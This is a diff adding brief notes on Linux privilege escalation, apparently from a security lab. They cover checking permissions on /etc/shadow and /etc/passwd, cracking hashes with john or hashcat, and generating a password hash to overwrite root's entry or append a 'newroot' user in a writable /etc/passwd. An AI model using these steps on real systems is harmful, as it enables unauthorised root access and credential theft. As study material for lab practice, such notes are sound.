@@ -1,0 +1,36 @@
+ls -l /etc/shadow
+
+#see permissions
+=====================================================================================================
+
+using john or hashcat crack the hash is between two :
+=====================================================================================================
+
+mkpasswd -m sha-512 password-pass
+#create a hash of sha-512crypt for linux
+
+=====================================================================================================
+
+ls -l /etc/passwd
+#see permissions
+
+=====================================================================================================
+
+Generate a new password hash with a password of your choice:
+
+openssl passwd newpasswordhere
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+su root
+
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+
+Now switch to the newroot user, using the new password:
+
+su newroot
+
+==================================================================================================
+
+
